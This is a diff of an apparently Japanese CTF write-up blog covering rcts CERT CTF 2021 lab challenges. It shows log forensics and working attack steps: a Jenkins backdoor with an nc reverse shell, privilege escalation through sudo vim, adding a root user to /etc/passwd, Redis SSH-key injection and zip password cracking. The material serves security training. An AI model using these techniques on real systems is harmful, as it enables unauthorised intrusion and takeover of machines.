+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;abc043&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;nicole&#34;</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;ZmxhZ3tzMG0zdGgxbmc=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;rockyou&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;0434567&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Fri</span> <span class="n">Jun</span> <span class="mi">25</span> <span class="mo">03</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mo">03</span> <span class="mi">2021</span> <span class="p">[</span><span class="n">pid</span> <span class="mi">1</span><span class="p">]</span> <span class="p">[</span><span class="n">ftp</span><span class="p">]</span> <span class="n">OK</span> <span class="nl">LOGIN</span><span class="p">:</span> <span class="n">Client</span> <span class="s">&#34;192.168.1.23&#34;</span><span class="p">,</span> <span class="n">anon</span> <span class="n">password</span> <span class="s">&#34;043456789&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span></span></span></code></pre></td></tr></table>
 </div>
 </div></p>
 <br>
 <p>ssh.log
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -494,20 +490,20 @@ Can you see what happened and if there was a host compromised?</p>
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mo">05</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">2955</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mo">05</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">3028</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">14</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span> <span class="n">on</span> <span class="mf">192.168.1.7</span> <span class="n">port</span> <span class="mi">22</span> <span class="n">rdomain</span> <span class="s">&#34;&#34;</span>
-<span class="hl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">14</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Invalid</span> <span class="n">user</span> <span class="n">X3N1c3AxYzEwdXN9</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span>
-</span><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">15</span> <span class="n">lockedout</span> <span class="n">daemon</span><span class="p">.</span><span class="n">info</span> <span class="nl">init</span><span class="p">:</span> <span class="n">process</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">getty</span> <span class="o">-</span><span class="n">L</span> <span class="mi">0</span> <span class="n">ttyS0</span> <span class="n">vt100</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">3028</span><span class="p">)</span> <span class="n">exited</span><span class="p">.</span> <span class="n">Scheduling</span> <span class="k">for</span> <span class="n">restart</span><span class="p">.</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="nl">error</span><span class="p">:</span> <span class="n">Could</span> <span class="n">not</span> <span class="n">get</span> <span class="n">shadow</span> <span class="n">information</span> <span class="k">for</span> <span class="n">NOUSER</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="n">invalid</span> <span class="n">user</span> <span class="n">X3N1c3AxYzEwdXN9</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span> <span class="n">ssh2</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">daemon</span><span class="p">.</span><span class="n">info</span> <span class="nl">init</span><span class="p">:</span> <span class="n">starting</span> <span class="n">pid</span> <span class="mi">3031</span><span class="p">,</span> <span class="n">tty</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">ttyS0</span><span class="err">&#39;</span><span class="o">:</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">getty</span> <span class="o">-</span><span class="n">L</span> <span class="mi">0</span> <span class="n">ttyS0</span> <span class="n">vt100</span><span class="err">&#39;</span>
-<span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">3031</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
-<span class="p">...(</span><span class="n">snip</span><span class="p">)...</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mo">05</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">2955</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mo">05</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">3028</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">14</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span> <span class="n">on</span> <span class="mf">192.168.1.7</span> <span class="n">port</span> <span class="mi">22</span> <span class="n">rdomain</span> <span class="s">&#34;&#34;</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">14</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Invalid</span> <span class="n">user</span> <span class="n">X3N1c3AxYzEwdXN9</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">15</span> <span class="n">lockedout</span> <span class="n">daemon</span><span class="p">.</span><span class="n">info</span> <span class="nl">init</span><span class="p">:</span> <span class="n">process</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">getty</span> <span class="o">-</span><span class="n">L</span> <span class="mi">0</span> <span class="n">ttyS0</span> <span class="n">vt100</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">3028</span><span class="p">)</span> <span class="n">exited</span><span class="p">.</span> <span class="n">Scheduling</span> <span class="k">for</span> <span class="n">restart</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="nl">error</span><span class="p">:</span> <span class="n">Could</span> <span class="n">not</span> <span class="n">get</span> <span class="n">shadow</span> <span class="n">information</span> <span class="k">for</span> <span class="n">NOUSER</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">info</span> <span class="n">sshd</span><span class="p">[</span><span class="mi">3029</span><span class="p">]</span><span class="o">:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="n">invalid</span> <span class="n">user</span> <span class="n">X3N1c3AxYzEwdXN9</span> <span class="n">from</span> <span class="mf">192.168.1.23</span> <span class="n">port</span> <span class="mi">53522</span> <span class="n">ssh2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">daemon</span><span class="p">.</span><span class="n">info</span> <span class="nl">init</span><span class="p">:</span> <span class="n">starting</span> <span class="n">pid</span> <span class="mi">3031</span><span class="p">,</span> <span class="n">tty</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">ttyS0</span><span class="err">&#39;</span><span class="o">:</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">getty</span> <span class="o">-</span><span class="n">L</span> <span class="mi">0</span> <span class="n">ttyS0</span> <span class="n">vt100</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Jun</span> <span class="mi">25</span> <span class="mo">00</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">16</span> <span class="n">lockedout</span> <span class="n">auth</span><span class="p">.</span><span class="n">err</span> <span class="n">getty</span><span class="p">[</span><span class="mi">3031</span><span class="p">]</span><span class="o">:</span> <span class="nl">tcgetattr</span><span class="p">:</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">error</span><span class="o">^</span><span class="n">M</span>
+</span></span><span class="line"><span class="cl"><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span></span></span></code></pre></td></tr></table>
 </div>
 </div></p>
-<p><br /></p>
+<br />
 <pre>
 $ echo ZmxhZ3tzMG0zdGgxbmc= | base64 -d
 flag{s0m3th1ng
@@ -515,7 +511,7 @@ flag{s0m3th1ng
 $ echo X3N1c3AxYzEwdXN9 | base64 -d ; echo
 _susp1c10us}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{s0m3th1ng_susp1c10us}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -533,7 +529,7 @@ Can you check if we can get the access back?</p>
 <ul>
 <li>lockedout.ova</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>まずは nmap で空いているポートを確認します。</p>
 <pre>
@@ -622,9 +618,9 @@ Permission denied, please try again.
 <p>Jenkinsは攻撃によく使われるやつなので、とっかかりはこっちが正解です。admin / admin で入れます。</p>
 <p>New Item -&gt; Freestyle project で、backdoorをしかけます。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_jenkins1.png" alt="rcts_cert_CTF_2021_jenkins1.png">
-<p><br /></p>
+<br />
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_jenkins2.png" alt="rcts_cert_CTF_2021_jenkins2.png">
-<p><br /></p>
+<br />
 <p>Raw Shellの中、Python3と/bin/ashを使ってterminalを設定します。(ちなみに、/bin/bashはありませんでした。)</p>
 <pre>
 $ nc 192.168.0.213 4444
@@ -653,7 +649,7 @@ fg
 reset
 
 </pre>
-<p><br /></p>
+<br />
 <p>GTFOBins（<a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a>）に従って、権限昇格してみます。</p>
 <pre>
 sudo /usr/bin/vim -c ':!/bin/ash'
@@ -666,8 +662,8 @@ uid=0(root2) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),1
 $
 
 </pre>
-<p><br />
-その他、/etc/passwd に別のrootユーザを追加するやり方でもroot権限は取れます。なお、Raw shellでうまくファイル編集ができない場合は、以下のようにvimの引数を使う方法もあります。そうすると編集が終わった状態で立ち上がります。</p>
+<br />
+その他、/etc/passwd に別のrootユーザを追加するやり方でもroot権限は取れます。なお、Raw shellでうまくファイル編集ができない場合は、以下のようにvimの引数を使う方法もあります。そうすると編集が終わった状態で立ち上がります。
 <pre>
 sudo /usr/bin/vim /etc/passwd +"a|root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh"
 
@@ -677,8 +673,8 @@ Password:
 uid=0(root2) gid=0(root) groups=0(root)
 
 </pre>
-<p><br />
-これでroot2としてSSHログインもできると思ったんですが、どうもログインできないので、SSHの設定どうなっているんだと思って sshd_config を確認することにしました。</p>
+<br />
+これでroot2としてSSHログインもできると思ったんですが、どうもログインできないので、SSHの設定どうなっているんだと思って sshd_config を確認することにしました。
 <pre>
 cat /etc/ssh/sshd_config
 
@@ -692,7 +688,7 @@ cat /etc/ssh/sshd_config
 ...(snip)...
 </pre>
 <p>あー、Root Loginは無効になっているのね。てか、フラグ見つかったし。。。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{r00t_l0gin_1s_1ns3cur3}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -704,7 +700,7 @@ cat /etc/ssh/sshd_config
 <br /><br />
 Can you track this one and find more information about the attacker?</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>（これは、イベント中に解けなかったやつです。）</p>
 <p><code>maintain persistence</code> と書かれていたので、cronで動く何かだと思ったんですよね。</p>
@@ -713,8 +709,8 @@ Can you track this one and find more information about the attacker?</p>
 Jun 25 00:30:00 lockedout cron.info crond[2047]: USER root pid 2878 cmd run-parts /etc/periodic/15min
 Jun 25 00:30:00 lockedout cron.info crond[2047]: USER root pid 2879 cmd python3 /bin/stayalive
 </pre>
-<p><br />
-python byte-compiledファイルだったので、pycdcとかpycdasを使ってコードを調べたりしました。</p>
+<br />
+python byte-compiledファイルだったので、pycdcとかpycdasを使ってコードを調べたりしました。
 <br>
 c2domainと通信しようとしてそうで、怪しさ満載。
 <pre>
@@ -743,7 +739,7 @@ lockedout:/# grep flag /root/.viminfo
 </pre>
 <br>
 <p>Flag: <code>flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}</code></p>
-<p><br /></p>
+<br />
 <p>参考までに、以下はLinuxで確認した方がいいファイルのリストです。(~/.viminfo 書かれてます)<br />
 <a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/">https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/</a></p>
 <p><br /><br />
@@ -760,7 +756,7 @@ Let’s use our Red team skills and get foothold on the machine.</p>
 <ul>
 <li>hyp3r10n.ova</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>（Lockされてたやつが、イベント後に見れるようになっていたので、後日やってみました。）</p>
 <p>まずは nmap で空いているポートを確認します。</p>
@@ -782,8 +778,8 @@ PORT     STATE SERVICE VERSION
 6379/tcp open  redis   Redis key-value store 6.0.14
 
 </pre>
-<p><br />
-明らかに <code>redis</code> が怪しいですね。Redisの脆弱性を突く手法は HTB/Postman で出てきています。このチャレンジでも、同じ事が可能です。</p>
+<br />
+明らかに `redis` が怪しいですね。Redisの脆弱性を突く手法は HTB/Postman で出てきています。このチャレンジでも、同じ事が可能です。
 <p>なお、以下の -x set aaa の部分の文字列 &ldquo;aaa&rdquo; は、なんでもいいみたいです。</p>
 <pre>
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > ssh.txt
@@ -860,7 +856,7 @@ Can you help us out?
 <br /><br />
 No brute force is required.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>（前述の &lsquo;Blue team becomes Red Team&rsquo; の続きのチャレンジです。）</p>
 <p>ホーム配下にあるファイルを確認すると、private keyが見つかります。catを使ってローカルに持ってきます（中身のコピペ）。</p>
@@ -952,7 +948,7 @@ hyp3r10n:~# cat root.txt
 flag{h4ck1ng_th3_h4ck3r}
 
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{h4ck1ng_th3_h4ck3r}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -962,9 +958,9 @@ flag{h4ck1ng_th3_h4ck3r}
 <blockquote>
 <p>We’ve discovered some projects and a zip file inside the server. Let’s see if we can figure some information of our attacker from those, maybe we can track down our attacker and report it to the authorities.
 <br /><br />
-Flag format: flag{&lsquo;BSSID&rsquo;_&lsquo;email&rsquo;}</p>
+Flag format: flag{&lsquo;BSSID&rsquo;_&rsquo;email&rsquo;}</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <p>（これも続きです。）</p>
 <p>/root/ 配下に、確かに Projects と home.zip があります。</p>
@@ -1013,7 +1009,7 @@ commit da59093e90bdad57ad87f67d295a5e85ded7f941 (HEAD -> main, origin/main, orig
 Author: Mateos Santiago &lt;mateossanti0@gmail.com>
 
 </pre>
-<p><br /></p>
+<br />
 <p>home.zipに関しては、パスワードが付いているので、ローカルにscpしてきた後 john で crack します。結局、同じパスワード (barcelona1) でした。</p>
 <pre>
 $ zip2john home.zip > hash.txt
@@ -1036,7 +1032,7 @@ $ cat home/Wifi\ config.txt
 SSID: MOVISTAR_56F7
 Pwd: barcelona1
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{MOVISTAR_56F7_mateossanti0@gmail.com}</code> （こうかな？ もしかしたら違うかもです。）</p>
 <p><br /><br />
 <br /><br /></p>
@@ -1057,20 +1053,20 @@ No brute force is required.</p>
 <li>id_rsa</li>
 <li>knock_knock.ova</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <p>チャレンジ文より、port knockingをしてSSHポートを開けた後、private keyを使ってSSHするのは明らかです。</p>
 <p>ちなみに、port knockingを使ったものでは、VulnHubにある <a href="https://www.vulnhub.com/entry/dc-9,412/">DC9</a> があります。 これは、OSCPの勉強中にやりました。</p>
 <p>DC9の方では、Webの脆弱性を用いて /etc/knockd.conf を取得するやり方でしたが、こちらのチャレンジでは Anonymous ftp をするとバナーにポート番号が表示されるものでした。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_knock_knock_ftp.png" alt="rcts_cert_CTF_2021_knock_knock_ftp.png">
-<p><br /></p>
+<br />
 <div class="admonition tip"><p class="admonition-title">Tips</p>
-<p>FTP getの末尾にハイフン('-')を付けるとファイルの中身だけ見れます。</p>
+<p>FTP getの末尾にハイフン(&rsquo;-&rsquo;)を付けるとファイルの中身だけ見れます。</p>
 </div>
-<p><br /></p>
+<br />
 <p>なお、どのサービスが動いているかは、nmapせずとも起動時の出力結果でわかります。サーバーがリモートかローカルで、こういう所が違ってきますね。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_knock_knock_boot.png" alt="rcts_cert_CTF_2021_knock_knock_boot.png">
-<p><br /></p>
+<br />
 <p>以下のようにport knockingすると、SSHポートが開きます。(closed -&gt; open)</p>
 <pre>
 $ nmap -p22 -sT 192.168.0.199
@@ -1095,7 +1091,7 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
 </pre>
-<p><br /></p>
+<br />
 <p>これで ssh ができるわけですが、ユーザ名が必要です。</p>
 <p>チャレンジ文に <code>No brute force is required.</code> と書かれているし、動いているサービスも限られるのでどうしたものかと少々悩んだんですが、Discordを見てたら「username in id_rsa」というヒントを発見。</p>
 <p>そうだっけ？と思いつつ、base64 decodeしてみるとユーザ名 &lsquo;ctf&rsquo; が見つかりました。</p>
@@ -1134,9 +1130,9 @@ knockknock:~$ cat flag.txt
 flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}
 
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}</code></p>
-<p><br /></p>
+<br />
 <p>なお、/etc/knockd.conf は以下のようになってました。</p>
 <pre>
 knockknock:~$ cat /etc/knockd.conf
@@ -1174,7 +1170,7 @@ Regex: flag{[0-9a-z_]+}</p>
 <ul>
 <li>capture.pcap</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-8">Solution</h3>
 <p>USB pcapです。</p>
 <p>これは、<a href="https://captureamerica.github.io/writeups/post/sarctf_2020/">sarCTF_2020</a> で以前やったチャレンジとほぼ同様です。</p>
@@ -1199,15 +1195,15 @@ usb.pyは他の方の書いたコードなので、今回もここには載せ�
 <ul>
 <li>the-jetsons-family.jpg</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <p>(イベント終了後にWriteupを参照させてもらって解きました。)</p>
 <p>「青い空を見上げればいつもそこに白い猫」 を使ったところ、「steghideの可能性あり」とのことだったんですが、パスフレーズがわからなくて降参したやつです。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_neko.png" alt="rcts_cert_CTF_2021_neko.png">
-<p><br /></p>
+<br />
 <p>（ここで、他の方のwriteupを参照させてもらっています。）</p>
 <p><a href="https://github.com/RickdeJager/stegseek">stegseek</a> というツールでパスフレーズが見つかるようですね。初めて使いました。</p>
-<p><br /></p>
+<br />
 <p>特に、rockyou.txt を指定しなくても、crackできちゃうみたいです。しかも、パスフレーズを見つけた後に crack までやってくれます。</p>
 <pre>
 $ stegseek the-jetsons-family.jpg
@@ -1227,7 +1223,7 @@ $ cat the-jetsons-family.jpg.out | base64 -d | base64 -d ; echo
 flag{ThEfUtUrEiSnOw!}
 
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{ThEfUtUrEiSnOw!}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1244,17 +1240,17 @@ Find out which was the model whose photo was damaged.</p>
 <li>welcome_to_lisbon.jpg</li>
 </ul>
 <img src="https://captureamerica.github.io/writeups/img/welcome_to_lisbon.jpg" alt="welcome_to_lisbon.jpg">
-<p><br /></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <p>普段はOSINTチャレンジはパスするんですが、今回はちょっと頑張りました。</p>
 <p>赤塗されたところのモデルの名前を見つけてください、というチャレンジ。</p>
 <p>ぱっと見、空港っぽいし、&lsquo;Welcome To Lisbon!&rsquo; とのことなので、<code>&quot;victoria's secret&quot; Lisbon airport</code> でググるとモデルの写真は見つかります。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Lisbon.png" alt="rcts_cert_CTF_2021_Lisbon.png">
-<p><br /></p>
+<br />
 <p>この後、ひたすらググって調べるんですが、下着の女性の写真ばっかり出てくるので家族に見られるとヤバいやつです。</p>
 <p><code>victoria secret's model faces</code> というキーワードで顔にフォーカスしてググるのがポイントだったと思います。</p>
 <p>何度かトライ＆エラーして、フラグ通しました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{Adriana_Lima}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1266,12 +1262,12 @@ Find out which was the model whose photo was damaged.</p>
 <br /><br />
 URL: <a href="http://challenges.defsoc.tk:8080">http://challenges.defsoc.tk:8080</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-11">Solution</h3>
 <p>ソースコードが見えるようになっています。例のPHPの <code>0e</code> の比較のやつです。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1294,38 +1290,38 @@ URL: <a href="http://challenges.defsoc.tk:8080">http://challenges.defsoc.tk:8080
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-PHP" data-lang="PHP"><span class="cp">&lt;?php</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
